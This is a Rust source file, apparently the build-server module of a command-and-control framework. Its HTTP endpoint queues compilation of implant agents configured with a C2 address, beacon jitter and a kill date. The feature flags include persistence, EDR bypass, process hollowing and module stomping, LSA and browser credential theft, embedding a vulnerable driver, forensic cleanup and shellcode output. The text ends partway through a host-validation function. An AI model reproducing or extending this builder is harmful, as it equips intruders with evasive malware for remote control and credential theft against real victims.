use axum::{extract::State, http::StatusCode, response::IntoResponse, Json};
use chrono::{Datelike, NaiveDate, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use uuid::Uuid;

use crate::auth::AuthenticatedUser;
use crate::state::AppState;

#[derive(Deserialize, Debug, Clone)]
pub struct BuildRequest {
    pub os: String,
    pub arch: String,
    /// Output format: "exe" (default) or "shellcode".
    #[serde(default = "default_format")]
    pub format: String,
    /// Transport: "tls" (default), "http", "doh", "ssh", "smb".
    #[serde(default = "default_transport")]
    pub transport: String,
    /// Optional runtime settings for transports that need more than host/port.
    #[serde(default)]
    pub transport_config: BuildTransportConfig,
    pub features: BuildFeatures,
    pub host: String,
    pub port: u16,
    pub pin: String,
    pub key: String,
    pub output_dir: Option<String>,
    /// Sleep interval in milliseconds (default 5000).
    #[serde(default = "default_sleep_ms")]
    pub sleep_ms: u64,
    /// Jitter percentage 0-100 (default 20).
    #[serde(default = "default_jitter")]
    pub jitter: u8,
    /// Optional kill date as "YYYY-MM-DD". The agent shuts down after this date.
    #[serde(default)]
    pub kill_date: Option<String>,
    /// Optional hex-encoded 64-bit seed for reproducible builds.
    #[serde(default)]
    pub seed: Option<String>,
    /// Optional PE version info (Windows only).
    #[serde(default)]
    pub version_info: Option<PeVersionInfo>,
    /// Optional manifest preset (Windows only): "service", "elevated", "standard".
    #[serde(default)]
    pub manifest_preset: Option<String>,
    /// Server-side path to the XOR-encrypted vulnerable driver binary to embed.
    ///
    /// Required when `features.embedded_driver` is `true` for a Windows build.
    /// The file at this path is passed to the agent build as `ORCHESTRA_DRIVER_PATH`
    /// so `deploy.rs` can `include_bytes!` it at compile time.
    #[serde(default)]
    pub driver_path: Option<String>,
}

fn default_format() -> String {
    "exe".into()
}
fn default_transport() -> String {
    "tls".into()
}
fn default_sleep_ms() -> u64 {
    5000
}
fn default_jitter() -> u8 {
    20
}

#[derive(Deserialize, Debug, Clone)]
pub struct PeVersionInfo {
    pub file_version: Option<String>,
    pub file_description: Option<String>,
    pub company_name: Option<String>,
    pub product_name: Option<String>,
    pub original_filename: Option<String>,
}

#[derive(Deserialize, Debug, Clone, Default)]
pub struct BuildTransportConfig {
    #[serde(default)]
    pub http_endpoint: Option<String>,
    #[serde(default)]
    pub http_host_header: Option<String>,
    #[serde(default)]
    pub doh_server_url: Option<String>,
    #[serde(default)]
    pub doh_domain: Option<String>,
    #[serde(default)]
    pub ssh_host: Option<String>,
    #[serde(default)]
    pub ssh_port: Option<u16>,
    #[serde(default)]
    pub ssh_username: Option<String>,
    #[serde(default)]
    pub ssh_auth: Option<common::config::SshAuthConfig>,
    #[serde(default)]
    pub ssh_host_key_fingerprint: Option<String>,
    #[serde(default)]
    pub smb_pipe_host: Option<String>,
    #[serde(default)]
    pub smb_pipe_name: Option<String>,
    #[serde(default)]
    pub smb_pipe_mode: Option<String>,
    #[serde(default)]
    pub smb_tcp_relay_port: Option<u16>,
}

#[derive(Deserialize, Debug, Clone, Default)]
pub struct BuildFeatures {
    #[serde(default)]
    pub persistence: bool,
    /// Enables `direct-syscalls` in the agent.
    #[serde(default)]
    pub direct_syscalls: bool,
    /// Enables `remote-assist` in the agent (screen capture + input simulation).
    #[serde(default)]
    pub remote_assist: bool,
    #[serde(default)]
    pub stealth: bool,
    /// Enables `network-discovery` feature (ARP/TCP scan/DNS).
    #[serde(default)]
    pub network_discovery: bool,
    /// Enables `forensic-cleanup` feature (prefetch, USN, timestamps).
    #[serde(default)]
    pub forensic_cleanup: bool,
    /// Enables self re-encoding (.text section morphing).
    #[serde(default)]
    pub self_reencode: bool,
    /// Enables HTTP CDN relay transport.
    #[serde(default)]
    pub http_transport: bool,
    /// Enables DNS-over-HTTPS transport.
    #[serde(default)]
    pub doh_transport: bool,
    /// Enables SSH tunnel transport.
    #[serde(default)]
    pub ssh_transport: bool,
    /// Enables SMB named pipe transport.
    #[serde(default)]
    pub smb_pipe_transport: bool,
    /// Enables EDR bypass transform engine.
    #[serde(default)]
    pub evasion_transform: bool,
    /// Enables P2P mesh networking.
    #[serde(default)]
    pub p2p: bool,
    /// Enables stack spoofing.
    #[serde(default)]
    pub stack_spoof: bool,
    /// Enables reflective/manual module mapping.
    #[serde(default)]
    pub manual_map: bool,
    /// Enables browser stored-data recovery.
    #[serde(default)]
    pub browser_data: bool,
    /// Enables LSA Whisperer.
    #[serde(default)]
    pub lsa_whisperer: bool,
    /// Enables kernel callback overwrite support.
    #[serde(default)]
    pub kernel_callback: bool,
    /// Embeds the configured BYOVD driver payload when available.
    #[serde(default)]
    pub embedded_driver: bool,
    /// Enables continuous memory hiding.
    #[serde(default)]
    pub evanesco: bool,
    /// Enables user-mode syscall emulation.
    #[serde(default)]
    pub syscall_emulation: bool,
    /// Enables CET/shadow-stack bypass support.
    #[serde(default)]
    pub cet_bypass: bool,
    /// Enables token-only impersonation.
    #[serde(default)]
    pub token_impersonation: bool,
    /// Enables NTFS transaction-backed process hollowing.
    #[serde(default)]
    pub transacted_hollowing: bool,
    /// Enables delayed module-stomp injection.
    #[serde(default)]
    pub delayed_stomp: bool,
}

#[derive(Serialize)]
pub struct BuildResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub job_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub log: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
}

#[derive(Clone)]
pub struct JobState {
    pub status: String,
    pub log: String,
    pub output_path: Option<String>,
    pub error: Option<String>,
    /// Unix timestamp (seconds) when the job transitioned to Running.
    pub started_at: u64,
    /// P1-28: Operator ID that enqueued the build, used for ownership checks
    /// on status / download endpoints.
    pub operator: String,
}

pub struct BuildJob {
    pub job_id: String,
    pub req: BuildRequest,
    pub operator: String,
    pub server_build_dir: PathBuf,
    pub state_ref: Arc<AppState>,
}

static JOB_MAP: OnceLock<Arc<Mutex<HashMap<String, JobState>>>> = OnceLock::new();
static JOB_SENDER: OnceLock<mpsc::Sender<BuildJob>> = OnceLock::new();

pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32) {
    if JOB_SENDER.get().is_some() {
        return;
    }

    let map = Arc::new(Mutex::new(HashMap::new()));
    let _ = JOB_MAP.set(map.clone());

    let (tx, rx) = mpsc::channel::<BuildJob>(100);
    let rx = Arc::new(tokio::sync::Mutex::new(rx));
    let _ = JOB_SENDER.set(tx);

    for i in 0..workers.max(1) {
        let map_clone = map.clone();
        let rx = rx.clone();
        tokio::spawn(async move {
            loop {
                let job = {
                    let mut rx_lock = rx.lock().await;
                    rx_lock.recv().await
                };
                let Some(job) = job else {
                    break;
                };

                {
                    let mut m = map_clone.lock().unwrap();
                    if let Some(s) = m.get_mut(&job.job_id) {
                        s.status = "Running".to_string();
                        s.error = None;
                        s.started_at = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        s.log
                            .push_str(&format!("[Worker {}] Started job {}\n", i, job.job_id));
                    }
                }

                let BuildJob {
                    job_id,
                    req,
                    operator,
                    server_build_dir,
                    state_ref,
                } = job;

                let res = tokio::task::spawn_blocking({
                    let map2 = map_clone.clone();
                    let jid = job_id.clone();
                    let agent_secret = state_ref.config.agent_shared_secret.clone();
                    let module_key = state_ref.config.module_aes_key.clone();
                    move || {
                        execute_build_safely(
                            jid,
                            req,
                            operator,
                            server_build_dir,
                            map2,
                            agent_secret,
                            module_key,
                        )
                    }
                })
                .await
                // P2-15: propagate JoinError instead of panicking.
                .unwrap_or_else(|e| Err(anyhow::anyhow!("build task panicked: {e}")));

                let (outcome_str, fs_path, error) = match res {
                    Ok(path) => ("Completed", Some(path), None),
                    Err(e) => {
                        let error = e.to_string();
                        let mut m = map_clone.lock().unwrap();
                        if let Some(s) = m.get_mut(&job_id) {
                            s.log.push_str(&format!("\nBuild failed: {}\n", error));
                        }
                        ("Failed", None, Some(error))
                    }
                };

                let mut m = map_clone.lock().unwrap();
                if let Some(s) = m.get_mut(&job_id) {
                    s.status = outcome_str.to_string();
                    s.output_path = fs_path;
                    s.error = error;
                    if outcome_str == "Completed" {
                        s.log.push_str("\n--- Build Successful ---\n");
                    }
                }
            }
        });
    }

    // Retention task
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
            let mut m = map.lock().unwrap();
            m.retain(|_, v| {
                if v.status == "Queued" || v.status == "Running" {
                    return true;
                }
                // Remove completed/failed jobs older than build_retention_days (M-35 fix).
                let now_secs = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                let elapsed = now_secs.saturating_sub(v.started_at);
                elapsed < retention_days as u64 * 86400
            });
            // Cleanup FS
            if let Ok(entries) = std::fs::read_dir(&build_dir) {
                let now = std::time::SystemTime::now();
                let retention = std::time::Duration::from_secs(retention_days as u64 * 86400);
                for entry in entries.flatten() {
                    if let Ok(meta) = entry.metadata() {
                        if let Ok(modified) = meta.modified() {
                            if now.duration_since(modified).unwrap_or_default() > retention {
                                let _ = std::fs::remove_dir_all(entry.path());
                            }
                        }
                    }
                }
            }
        }
    });
}

pub async fn handle_build(
    State(state): State<Arc<AppState>>,
    axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
    Json(mut req): Json<BuildRequest>,
) -> Result<Json<BuildResponse>, (StatusCode, Json<BuildResponse>)> {
    if req.host.is_empty() || req.port == 0 || req.key.is_empty() || req.pin.is_empty() {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some("Missing required fields".into()),
            }),
        ));
    }
    if let Err(err) = validate_cert_pin(&req.pin) {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some(err.to_string()),
            }),
        ));
    }
    if let Some(ref seed_hex) = req.seed {
        if let Err(e) = validate_seed(seed_hex) {
            return Err((
                StatusCode::BAD_REQUEST,
                Json(BuildResponse {
                    job_id: None,
                    log: None,
                    status: None,
                    error: Some(e.to_string()),
                }),
            ));
        }
    }

    // P1-14: Reject build targets that point to private/internal IPs (SSRF).
    // Pin the resolved IP to prevent DNS rebinding attacks (V3 fix).
    let pinned_ip =
        match resolve_and_validate_host(&req.host, state.config.allow_local_builds).await {
            Ok(ip) => ip,
            Err(e) => {
                state.audit.record_simple(
                    "BUILDER",
                    &user.id,
                    "BuildRejected",
                    &format!("host={} reason={}", req.host, e),
                    common::Outcome::Failure,
                );
                return Err((
                    StatusCode::BAD_REQUEST,
                    Json(BuildResponse {
                        job_id: None,
                        log: None,
                        status: None,
                        error: Some(e.to_string()),
                    }),
                ));
            }
        };

    // Replace the hostname with the pinned IP so the agent connects directly
    // to the validated address, not the operator-supplied hostname.
    req.host = pinned_ip.to_string();

    // P1-15: Reject unsupported OS/arch values (TOML injection prevention).
    if let Err(e) = validate_target_os_arch(&req.os, &req.arch) {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some(e.to_string()),
            }),
        ));
    }
    if let Err(e) = validate_build_options(&req) {
        return Err((
            StatusCode::BAD_REQUEST,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: None,
                error: Some(e.to_string()),
            }),
        ));
    }

    // Initialize lazily if not done
    if JOB_SENDER.get().is_none() {
        // As a fallback to avoid crash if not properly initialized in main
        init_build_queue(1, PathBuf::from("/var/lib/orchestra/builds"), 7);
    }

    let job_id = Uuid::new_v4().to_string();

    state.audit.record_simple(
        "BUILDER",
        &user.id,
        "EnqueueBuild",
        &format!("job_id={job_id}"),
        common::Outcome::Success,
    );

    let sender = JOB_SENDER.get().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: Some("Failed".into()),
                error: Some("build queue not initialized".into()),
            }),
        )
    })?;
    let map = JOB_MAP.get().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            Json(BuildResponse {
                job_id: None,
                log: None,
                status: Some("Failed".into()),
                error: Some("build queue not initialized".into()),
            }),
        )
    })?;

    let operator_id = user.id.clone();

    {
        let mut m = map.lock().unwrap();
        m.insert(
            job_id.clone(),
            JobState {
                status: "Queued".to_string(),
                log: format!("Job {} enqueued.\n", job_id),
                output_path: None,
                error: None,
                started_at: 0,
                operator: operator_id,
            },
        );
    }

    if sender
        .send(BuildJob {
            job_id: job_id.clone(),
            req,
            operator: user.id,
            server_build_dir: state.config.builds_output_dir.clone(), // Get from app state
            state_ref: state.clone(),
        })
        .await
        .is_err()
    {
        let mut m = map.lock().unwrap();
        if let Some(s) = m.get_mut(&job_id) {
            s.status = "Failed".to_string();
            s.error = Some("build queue is not accepting jobs".to_string());
            s.log.push_str("build queue is not accepting jobs\n");
        }
        return Err((
            StatusCode::SERVICE_UNAVAILABLE,
            Json(BuildResponse {
                job_id: Some(job_id),
                log: None,
                status: Some("Failed".into()),
                error: Some("build queue is not accepting jobs".into()),
            }),
        ));
    }

    Ok(Json(BuildResponse {
        job_id: Some(job_id),
        log: None,
        status: Some("Queued".into()),
        error: None,
    }))
}

pub async fn handle_build_status(
    axum::extract::Path(job_id): axum::extract::Path<String>,
    axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
) -> Result<Json<BuildResponse>, (StatusCode, String)> {
    if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        if let Some(s) = m.get(&job_id) {
            // P1-28: Only the operator who enqueued the build (or an admin)
            // may view its status and logs.
            if s.operator != user.id && !user.has_permission("admin") {
                return Err((
                    StatusCode::FORBIDDEN,
                    "you are not the owner of this build job".into(),
                ));
            }
            return Ok(Json(BuildResponse {
                job_id: Some(job_id),
                log: Some(s.log.clone()),
                status: Some(s.status.clone()),
                error: s.error.clone(),
            }));
        }
    }
    Err((StatusCode::NOT_FOUND, "Job not found".to_string()))
}

fn execute_build_safely(
    job_id: String,
    req: BuildRequest,
    _operator: String,
    base_build_dir: PathBuf,
    map_rc: Arc<Mutex<HashMap<String, JobState>>>,
    agent_shared_secret: String,
    module_aes_key: Option<String>,
) -> anyhow::Result<String> {
    let append_log = |line: &str| {
        if let Ok(mut m) = map_rc.lock() {
            if let Some(s) = m.get_mut(&job_id) {
                s.log.push_str(line);
                s.log.push('\n');
            }
        }
    };

    let workspace = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .ok_or_else(|| anyhow::anyhow!("cannot resolve workspace root from CARGO_MANIFEST_DIR"))?;
    let temp_dir = tempfile::tempdir()?;
    let tmp_path = temp_dir.path();

    append_log(&format!(
        "Creating temporary sandbox at {}",
        tmp_path.display()
    ));

    copy_workspace_for_build(workspace, tmp_path)?;

    let profile = build_profile_from_request(&job_id, &req, &agent_shared_secret, module_aes_key)?;

    append_log("Executing cargo build within sandbox limits...");

    let mut cmd = Command::new("cargo");
    cmd.current_dir(tmp_path);
    cmd.arg("run")
        .arg("--release")
        .arg("-p")
        .arg("builder")
        .arg("--bin")
        .arg("orchestra-builder")
        .arg("--")
        .arg("build")
        .arg("temp_profile");

    // Pass the reproducibility seed through to the builder CLI when the
    // operator supplied one.
    if let Some(ref seed_hex) = req.seed {
        cmd.arg("--seed").arg(seed_hex);
    }

    let profile_dir = tmp_path.join("profiles");
    std::fs::create_dir_all(&profile_dir)?;
    std::fs::write(
        profile_dir.join("temp_profile.toml"),
        toml::to_string_pretty(&profile)?,
    )?;

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        unsafe {
            cmd.pre_exec(|| {
                libc::setrlimit(
                    libc::RLIMIT_AS,
                    &libc::rlimit {
                        rlim_cur: 4_000_000_000,
                        rlim_max: 4_000_000_000,
                    },
                );
                libc::setrlimit(
                    libc::RLIMIT_CPU,
                    &libc::rlimit {
                        rlim_cur: 300,
                        rlim_max: 300,
                    },
                );
                Ok(())
            });
        }
    }

    let output = cmd.output()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    append_log(&format!("stdout:\n{}", stdout));
    if !stderr.is_empty() {
        append_log(&format!("stderr:\n{}", stderr));
    }

    if !output.status.success() {
        anyhow::bail!("Build process failed.");
    }

    let enc_path = tmp_path.join("dist").join(format!("{job_id}.enc"));
    if !enc_path.exists() {
        anyhow::bail!("encrypted output not found at {}", enc_path.display());
    }

    // Choose output directory
    let mut out_dir = base_build_dir.clone();
    if let Some(user_dir) = req.output_dir {
        if !user_dir.trim().is_empty() {
            let requested = PathBuf::from(user_dir.trim());
            // Restrict build artifacts to subdirectories of the configured
            // build directory.  Accepting an arbitrary absolute path would
            // allow an authenticated operator to write artifacts to any
            // location writable by the server process (e.g. /etc, /tmp/evil).
            //
            // Canonicalize both sides so that `../` traversal sequences are
            // resolved before comparison.  If the requested path does not yet
            // exist (canonicalize returns Err), fall back to normalizing the
            // lexical path to catch obvious traversal attempts.
            let canonical_base =
                std::fs::canonicalize(&base_build_dir).unwrap_or_else(|_| base_build_dir.clone());
            let canonical_requested = std::fs::canonicalize(&requested).unwrap_or_else(|_| {
                // Path doesn't exist yet; normalize lexically by resolving
                // `.` and `..` components from the path root so that e.g.
                // `/builds/../etc` correctly resolves to `/etc` (outside
                // the build dir) rather than appearing to be a subdirectory.
                let mut acc = PathBuf::new();
                for component in requested.components() {
                    match component {
                        std::path::Component::RootDir => acc.push("/"),
                        std::path::Component::Prefix(p) => acc.push(p.as_os_str()),
                        std::path::Component::CurDir => {} // skip `.`
                        std::path::Component::ParentDir => {
                            acc.pop();
                        }
                        std::path::Component::Normal(p) => acc.push(p),
                    }
                }
                acc
            });
            if canonical_requested.starts_with(&canonical_base) {
                out_dir = requested;
            } else {
                anyhow::bail!(
                    "output_dir '{}' must be within the configured builds directory '{}'",
                    user_dir.trim(),
                    base_build_dir.display()
                );
            }
        }
    }

    // YYYY-MM-DD_jobid
    let today = Utc::now();
    let folder_name = format!(
        "{:04}-{:02}-{:02}_{}",
        today.year(),
        today.month(),
        today.day(),
        &job_id[..8]
    );
    let final_dir = out_dir.join(&folder_name);

    std::fs::create_dir_all(&final_dir)
        .map_err(|e| anyhow::anyhow!("Failed to create output dir {:?}: {}", final_dir, e))?;

    let final_dest = final_dir.join(format!("agent-{job_id}.enc"));
    std::fs::copy(&enc_path, &final_dest)?;

    append_log(&format!("Saved successfully to: {}", final_dest.display()));

    Ok(final_dest.to_string_lossy().to_string())
}

fn build_profile_from_request(
    job_id: &str,
    req: &BuildRequest,
    agent_shared_secret: &str,
    module_aes_key: Option<String>,
) -> anyhow::Result<builder::config::PayloadConfig> {
    validate_cert_pin(&req.pin)?;
    validate_target_os_arch(&req.os, &req.arch)?;
    validate_build_options(req)?;
    let transport = parse_payload_transport(&req.transport)?;

    fn push_feature(features: &mut Vec<String>, feature: &str) {
        if !features.iter().any(|existing| existing == feature) {
            features.push(feature.to_string());
        }
    }

    let c2_addr = format!("{}:{}", req.host, req.port);
    let mut features = vec!["outbound-c".to_string()];
    if req.features.persistence {
        push_feature(&mut features, "persistence");
    }
    if req.features.direct_syscalls {
        push_feature(&mut features, "direct-syscalls");
    }
    if req.features.remote_assist {
        push_feature(&mut features, "remote-assist");
    }
    if req.features.stealth {
        push_feature(&mut features, "stealth");
    }
    if req.features.network_discovery {
        push_feature(&mut features, "network-discovery");
    }
    if req.features.forensic_cleanup {
        push_feature(&mut features, "forensic-cleanup");
    }
    if req.features.self_reencode {
        push_feature(&mut features, "self-reencode");
    }
    if req.features.http_transport {
        push_feature(&mut features, "http-transport");
    }
    if req.features.doh_transport {
        push_feature(&mut features, "doh-transport");
    }
    if req.features.ssh_transport {
        push_feature(&mut features, "ssh-transport");
    }
    if req.features.smb_pipe_transport {
        push_feature(&mut features, "smb-pipe-transport");
    }
    if req.features.evasion_transform {
        push_feature(&mut features, "evasion-transform");
    }
    if req.features.p2p {
        push_feature(&mut features, "p2p-tcp");
    }
    if req.features.stack_spoof {
        push_feature(&mut features, "stack-spoof");
    }
    if req.features.manual_map {
        push_feature(&mut features, "manual-map");
    }
    if req.features.browser_data {
        push_feature(&mut features, "browser-data");
    }
    if req.features.lsa_whisperer {
        push_feature(&mut features, "lsa-whisperer");
    }
    if req.features.kernel_callback {
        push_feature(&mut features, "kernel-callback");
    }
    if req.features.embedded_driver {
        push_feature(&mut features, "embedded_driver");
    }
    if req.features.evanesco {
        push_feature(&mut features, "evanesco");
    }
    if req.features.syscall_emulation {
        push_feature(&mut features, "syscall-emulation");
    }
    if req.features.cet_bypass {
        push_feature(&mut features, "cet-bypass");
    }
    if req.features.token_impersonation {
        push_feature(&mut features, "token-impersonation");
    }
    if req.features.transacted_hollowing {
        push_feature(&mut features, "transacted-hollowing");
    }
    if req.features.delayed_stomp {
        push_feature(&mut features, "delayed-stomp");
    }
    // Auto-enable transport feature based on transport field
    match transport {
        builder::config::PayloadTransport::Http => push_feature(&mut features, "http-transport"),
        builder::config::PayloadTransport::Doh => push_feature(&mut features, "doh-transport"),
        builder::config::PayloadTransport::Ssh => push_feature(&mut features, "ssh-transport"),
        builder::config::PayloadTransport::Smb => push_feature(&mut features, "smb-pipe-transport"),
        builder::config::PayloadTransport::Tls => {}
    }

    let version_info = req
        .version_info
        .as_ref()
        .map(|vi| builder::config::VersionInfoConfig {
            file_version: vi.file_version.clone(),
            product_version: None,
            file_description: vi.file_description.clone(),
            file_version_name: None,
            original_filename: vi.original_filename.clone(),
            product_name: vi.product_name.clone(),
            company_name: vi.company_name.clone(),
            legal_copyright: None,
            comments: None,
            clone_from: None,
        });

    Ok(builder::config::PayloadConfig {
        target_os: req.os.clone(),
        target_arch: req.arch.clone(),
        c2_address: c2_addr,
        encryption_key: req.key.clone(),
        hmac_key: None,
        // Use the server's actual agent_shared_secret as the PSK so the agent
        // authenticates with the same secret the server expects.
        c_server_secret: Some(agent_shared_secret.to_string()),
        server_cert_fingerprint: Some(req.pin.clone()),
        features,
        transport,
        transport_settings: builder::config::TransportSettings {
            http_endpoint: nonempty_clone(&req.transport_config.http_endpoint),
            http_host_header: nonempty_clone(&req.transport_config.http_host_header),
            doh_server_url: nonempty_clone(&req.transport_config.doh_server_url),
            doh_domain: nonempty_clone(&req.transport_config.doh_domain),
            ssh_host: nonempty_clone(&req.transport_config.ssh_host),
            ssh_port: req.transport_config.ssh_port,
            ssh_username: nonempty_clone(&req.transport_config.ssh_username),
            ssh_auth: req.transport_config.ssh_auth.clone(),
            ssh_host_key_fingerprint: nonempty_clone(
                &req.transport_config.ssh_host_key_fingerprint,
            ),
            smb_pipe_host: nonempty_clone(&req.transport_config.smb_pipe_host),
            smb_pipe_name: nonempty_clone(&req.transport_config.smb_pipe_name),
            smb_pipe_mode: nonempty_clone(&req.transport_config.smb_pipe_mode),
            smb_tcp_relay_port: req.transport_config.smb_tcp_relay_port,
        },
        output_name: Some(job_id.to_string()),
        package: "agent".to_string(),
        bin_name: Some("agent-standalone".to_string()),
        output_format: parse_payload_format(&req.format)?,
        sleep_ms: Some(req.sleep_ms),
        jitter: Some(req.jitter),
        kill_date: req.kill_date.clone(),
        version_info,
        icon_path: None,
        manifest_preset: req.manifest_preset.clone(),
        custom_manifest: None,
        strip_signature: true,
        strip_debug: true,
        module_aes_key,
        driver_path: req
            .driver_path
            .as_deref()
            .map(str::trim)
            .filter(|p| !p.is_empty())
            .map(str::to_string),
    })
}

/// Allowed target operating systems for builds.
const ALLOWED_OS: &[&str] = &["linux", "windows", "macos"];

/// Allowed target architectures for builds.
const ALLOWED_ARCH: &[&str] = &["x86_64", "aarch64"];

fn parse_payload_format(format: &str) -> anyhow::Result<builder::config::PayloadFormat> {
    match format.trim().to_ascii_lowercase().as_str() {
        "" | "exe" => Ok(builder::config::PayloadFormat::Exe),
        "shellcode" => Ok(builder::config::PayloadFormat::Shellcode),
        other => anyhow::bail!(
            "unsupported output format '{}'; allowed values: exe, shellcode",
            other
        ),
    }
}

fn parse_payload_transport(transport: &str) -> anyhow::Result<builder::config::PayloadTransport> {
    match transport.trim().to_ascii_lowercase().as_str() {
        "" | "tls" => Ok(builder::config::PayloadTransport::Tls),
        "http" => Ok(builder::config::PayloadTransport::Http),
        "doh" => Ok(builder::config::PayloadTransport::Doh),
        "ssh" => Ok(builder::config::PayloadTransport::Ssh),
        "smb" => Ok(builder::config::PayloadTransport::Smb),
        other => anyhow::bail!(
            "unsupported transport '{}'; allowed values: tls, http, doh, ssh, smb",
            other
        ),
    }
}

fn nonempty_clone(value: &Option<String>) -> Option<String> {
    value
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(str::to_string)
}

fn validate_build_options(req: &BuildRequest) -> anyhow::Result<()> {
    let format = parse_payload_format(&req.format)?;
    let transport = parse_payload_transport(&req.transport)?;
    if req.sleep_ms == 0 {
        anyhow::bail!("sleep_ms must be greater than zero");
    }
    if req.jitter > 100 {
        anyhow::bail!("jitter must be between 0 and 100");
    }
    if let Some(kill_date) = req.kill_date.as_deref() {
        validate_kill_date(kill_date)?;
    }
    let os = req.os.to_ascii_lowercase();
    let arch = req.arch.to_ascii_lowercase();
    if format == builder::config::PayloadFormat::Shellcode && (os != "windows" || arch != "x86_64")
    {
        anyhow::bail!("shellcode output is supported only for windows/x86_64 builds");
    }
    validate_transport_options(transport, req)?;
    validate_embedded_driver_options(req)?;
    Ok(())
}

fn validate_embedded_driver_options(req: &BuildRequest) -> anyhow::Result<()> {
    if req.features.embedded_driver {
        if req.os.to_ascii_lowercase() != "windows" {
            anyhow::bail!("embedded_driver is only supported for Windows builds");
        }
        if req
            .driver_path
            .as_deref()
            .map(str::trim)
            .filter(|p| !p.is_empty())
            .is_none()
        {
            anyhow::bail!(
                "embedded_driver requires driver_path (server-side path to XOR-encrypted driver binary)"
            );
        }
    }
    Ok(())
}

fn validate_transport_options(
    transport: builder::config::PayloadTransport,
    req: &BuildRequest,
) -> anyhow::Result<()> {
    match transport {
        builder::config::PayloadTransport::Tls
        | builder::config::PayloadTransport::Http
        | builder::config::PayloadTransport::Doh => Ok(()),
        builder::config::PayloadTransport::Ssh => {
            if nonempty_clone(&req.transport_config.ssh_username).is_none() {
                anyhow::bail!("ssh transport requires transport_config.ssh_username");
            }
            if req.transport_config.ssh_auth.is_none() {
                anyhow::bail!("ssh transport requires transport_config.ssh_auth");
            }
            Ok(())
        }
        builder::config::PayloadTransport::Smb => {
            if let Some(mode) = nonempty_clone(&req.transport_config.smb_pipe_mode) {
                if mode != "smb" && mode != "tcp_relay" {
                    anyhow::bail!(
                        "smb transport_config.smb_pipe_mode must be 'smb' or 'tcp_relay'"
                    );
                }
            }
            Ok(())
        }
    }
}

fn validate_kill_date(kill_date: &str) -> anyhow::Result<()> {
    let trimmed = kill_date.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    let parsed = NaiveDate::parse_from_str(trimmed, "%Y-%m-%d")
        .map_err(|_| anyhow::anyhow!("kill_date must use YYYY-MM-DD format"))?;
    let today = Utc::now().date_naive();
    if parsed <= today {
        anyhow::bail!("kill_date must be after today's UTC date");
    }
    Ok(())
}

/// Validate that the requested OS and arch are on the strict whitelist.
///
/// This prevents an operator from injecting arbitrary strings into the
/// generated TOML build profile (e.g. setting `os` to a path traversal or
/// shell metacharacter payload).
fn validate_target_os_arch(os: &str, arch: &str) -> anyhow::Result<()> {
    let os_lower = os.to_lowercase();
    if !ALLOWED_OS.contains(&os_lower.as_str()) {
        anyhow::bail!(
            "unsupported target OS '{}'; allowed values: {}",
            os,
            ALLOWED_OS.join(", ")
        );
    }
    let arch_lower = arch.to_lowercase();
    if !ALLOWED_ARCH.contains(&arch_lower.as_str()) {
        anyhow::bail!(
            "unsupported target architecture '{}'; allowed values: {}",
            arch,
            ALLOWED_ARCH.join(", ")
        );
    }
    Ok(())
}

fn validate_cert_pin(pin: &str) -> anyhow::Result<()> {
    let pin = pin.trim();
    if pin.len() != 64 || !pin.chars().all(|c| c.is_ascii_hexdigit()) {
        anyhow::bail!("pin must be a SHA-256 certificate fingerprint encoded as 64 hex characters");
    }
    Ok(())
}

fn validate_seed(seed_hex: &str) -> anyhow::Result<()> {
    let s = seed_hex.trim().trim_start_matches("0x");
    if s.is_empty() || s.len() > 16 || !s.chars().all(|c| c.is_ascii_hexdigit()) {
        anyhow::bail!(
            "seed must be a hex-encoded u64 (up to 16 hex characters, e.g. 'a1b2c3d4e5f6a7b8')"
        );
    }
    Ok(())
}

/// Resolve a build target hostname and validate that it does not resolve
/// to a private or internal IP address.  Prevents SSRF attacks that could
/// reach cloud instance metadata endpoints (e.g. 169.254.169.254) or
/// internal services.
///
/// Returns the pinned IP address to use in the agent's C2 configuration.
/// IP pinning prevents DNS rebinding attacks where an operator configures
/// a hostname that resolves to a public IP at validation time but is later
/// re-pointed to a private IP (e.g. 169.254.169.254) before the agent
/// connects.
///
/// **Tradeoff:** IP pinning means DNS-based load balancing will not work
/// for the agent's C2 address.  Operators who need DNS-based failover
/// should use a dedicated C2 protocol that supports multiple endpoints
/// rather than relying on DNS round-robin.
async fn resolve_and_validate_host(host: &str, allow_local: bool) -> anyhow::Result<IpAddr> {
    // Try to parse as an IP address first.
    if let Ok(ip) = host.parse::<IpAddr>() {
        if !allow_local && is_private_or_reserved(&ip) {
            anyhow::bail!(
                "host '{}' is a private/reserved IP address; \
                 build targets must use public infrastructure addresses \
                 (set allow_local_builds = true in config for local testing)",
                host
            );
        }
